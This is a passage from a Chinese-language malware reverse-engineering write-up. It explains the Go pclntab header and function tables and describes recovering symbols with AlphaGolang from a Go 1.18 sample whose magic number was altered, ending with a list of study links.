> 第 8 个字节为地址的大小，32bit 的为 4，64 bit 的为 8，至此的前 8 个字节可以看作是 pclntab 的 Header；
> 第 9 个字节开始是 function table 的起始位置，第一个 uintptr 元素为函数(pc, Program Counter) 的个数；
> 第 2 个 uintptr 元素为第 1 个函数(pc0) 的地址，第 3 个 uintptr 元素为第 1 个函数结构定义相对于 pclntab 的偏移，后面的函数信息就以此类推；
> 直到 function table 结束，下面就是 Source file table。Source file table 以 4 字节(int32)为单位，前 4 个字节代表 Source File 的数量，后面每一个 int32 都代表一个 Source File Path String 相对于 pclntab 的偏移；
> uintptr 代表一个指针类型，在 32bit 二进制文件中，等价于 uint32，在 64bit 二进制文件中，等价于 uint64 。

于是进行手动分析，直接利用IDA的segment信息中定位到.gopclntab，发现Magic Number发生了改变，从0xFFFFFFFB变为了0xFFFFFFF0：

![image-20220726101633556](D:\样本分析\dadda\new\\typora-user-images\image-20220726101633556.png)

![image-20220726101720074](D:\样本分析\dadda\new\\typora-user-images\image-20220726101720074.png)

后续对比发现结构差异仍然较大，判断可能是1.18版本的go文件结构发生了变化。因此寻找对go1.18进行符号恢复的工具：[AlphaGolang](https://github.com/SentineLabs/AlphaGolang)

由于dadda样本将文件特征值发生了更改，容易导致符号恢复失败，因此需要通过修改工具中的特征值或patch样本的特征值帮助工具对符号信息的定位，以此完成符号信息的恢复工作。目前工具能够定位到`firstModuledata`结构，并成功恢复函数名。





#### go样本逆向的学习资料

go样本逆向主要参考资料：

[Freebuf go样本逆向学习]([安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/member.html?memberId=122079))

[GO逆向分析小结-symtab解析](http://tttang.com/archive/1422/#toc_0x01)

[【技术推荐】正向角度看Go逆向]([【技术推荐】正向角度看Go逆向 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9015#toc-2))

